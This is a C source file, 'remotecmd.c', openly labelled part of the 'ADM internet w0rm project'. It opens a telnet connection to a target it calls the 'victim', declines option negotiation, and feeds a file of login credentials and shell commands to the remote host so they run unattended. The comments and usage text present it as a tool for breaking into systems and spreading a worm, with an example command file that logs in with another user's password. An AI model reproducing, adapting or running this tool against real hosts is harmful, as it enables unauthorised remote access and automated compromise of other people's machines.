/***************************************/
/* remotecmd.c (c) ADM                 */
/* do a non interactive telnet session */
/* -==* ADM internet w0rm project *==- */
/***************************************/

/**************************************************/
/* usage: remotecmd <victim> [filename] [time]    */
/* <victim>   : heheh The Victim ~!#!@ :)         */
/* [filename] : per default the file with the cmd */
/*              is "./cmd" u can change it :)     */
/* [time]     : time to sleep bitwin the cmd      */
/*              (in microseconds)                 */
/**************************************************/


/********** cmd file example  **********/
/*
   ** $ cat > cmd
   ** pooruser
   ** poorpasswd
   ** touch /tmp/netg_sistah_is_mine
   ** logout
   ** [Ctrl^D]
   ** $
 */
/* fun isnt it ? :pp */

/* The Infamous Define !! */

#define VERSION          "ADM remote commander 1.0 pub (c) ADM"
#define PROJECT          "ADM internet w0rm project"
#define OFFICIAL_ADM_GAL "Netguru Sister!$#"
#define LOVE              OFFICIAL_ADM_GAL
#define THINGS            "i lost my time #%$!#%"
#define SOMETHING         "Mais je l'aime steu CONNE!!"


/* hehe the include is not so bad %-) */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netdb.h>
#include <netinet/in.h>


void *memset (void *s, int c, size_t n);
void bzero (void *s, int n);
void usleep (unsigned long usec);
void dacmd (int, char *);
void usage (char *);
char *strcpy (char *dest, const char *src);
int ADMtelnet (u_long);
u_long host2ip (char *);


char FILE_CMD_NAME[1024] = "cmd";
u_long TIMEMETHAT = 500000;


void
main (int argc, char **argv)
{
  /* bla */
  if (argc < 2)
    usage (argv[0]);
  if (argc > 2)
    strcpy (FILE_CMD_NAME, argv[2]);
  if (argc > 3)
    TIMEMETHAT = atoi (argv[3]);

  ADMtelnet (host2ip (argv[1]));
}

void 
usage (char *c)
{
  fprintf (stderr, "-==* The ADM CreW *==-\n");
  fprintf (stderr, "usage  :%s <victim> [filename] [time in microsecond]\n", c);
  fprintf (stderr, "example: remotecmd www.h0h0.com ~root/cmdfile 500000\n");
  fprintf (stderr, "*** filename per default is cmd ***\n");
  fprintf (stderr, "*** time per defaulf is 500000 *** \n");
  exit (-1);
}

unsigned long
host2ip (char *serv)
{
  struct sockaddr_in sinn;
  struct hostent *hent;

  hent = gethostbyname (serv);
  if (hent == NULL)
    return 0;
  bzero ((char *) &sinn, sizeof (sinn));
  memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
  return sinn.sin_addr.s_addr;
}


/* diz function read the cmd from a file */
/* and he sent it over the socket        */

void
dacmd (int s, char *filename)
{
  FILE *filez;
  char tmp[255];
  bzero (tmp, sizeof (tmp));
  filez = fopen (filename, "r");

  while (!feof (filez))
    {
      fgets (tmp, sizeof (tmp), filez);
      printf (":%s<", tmp);
      write (s, tmp, strlen (tmp));
      usleep (TIMEMETHAT);
      bzero (tmp, sizeof (tmp));
    }
}

/*  make a telnet connection */

int
ADMtelnet (u_long ip)
{
  struct sockaddr_in sin;
  u_char buf[4000];
  int dasock, len;
  int longueur = sizeof (struct sockaddr_in);


  dasock = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);	/* gimme a socket */

  sin.sin_family = AF_INET;
  sin.sin_port = htons (23);
  sin.sin_addr.s_addr = ip;

  if (connect (dasock, (struct sockaddr *) &sin, longueur) == -1)
    return (-1);

  while (1)
    {
      memset (buf, 0, sizeof (buf));

      if ((len = read (dasock, buf, 1)) <= 0)
	break;

      if (*buf == (unsigned int) 255)
	{
	  read (dasock, (buf + 1), 2);
	  if (*(buf + 1) == (unsigned int) 253 && !(u_char) * (buf + 2));
	  else if ((u_char) * (buf + 1) == (unsigned int) 253)
	    {
	      *(buf + 1) = 252;
	      write (dasock, buf, 3);
	    }
	}
      else
	{
	  if (*buf != 0)
	    {
	      bzero (buf, sizeof (buf));
	      read (dasock, buf, sizeof (buf));
	      dacmd (dasock, FILE_CMD_NAME);
	      sleep (1);
	      return 1;
	    }

	}

    }
  return 0;
}
